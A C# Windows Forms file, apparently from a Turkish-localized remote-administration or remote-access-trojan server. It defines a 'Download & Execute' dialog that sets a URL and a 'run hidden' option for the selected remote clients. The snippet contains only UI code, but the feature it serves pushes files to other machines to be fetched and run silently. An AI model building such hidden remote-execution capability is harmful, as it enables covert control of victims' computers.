using System;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;

namespace xServer.Formlar
{
    public partial class FrmİndirÇalıştır : Form
    {
        private readonly int _selectedClients;

        public FrmİndirÇalıştır(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();
        }

        private void btnDownloadAndExecute_Click(object sender, EventArgs e)
        {
            İndirÇalıştır.URL = txtURL.Text;
            İndirÇalıştır.RunHidden = chkRunHidden.Checked;

            DialogResult = DialogResult.OK;
            Close();
        }

        private void FrmDownloadAndExecute_Load(object sender, EventArgs e)
        {
            Text = PencereYardımcısı.GetWindowTitle("İndir & Çalıştır", _selectedClients);
            txtURL.Text = İndirÇalıştır.URL;
            chkRunHidden.Checked = İndirÇalıştır.RunHidden;
        }
    }
}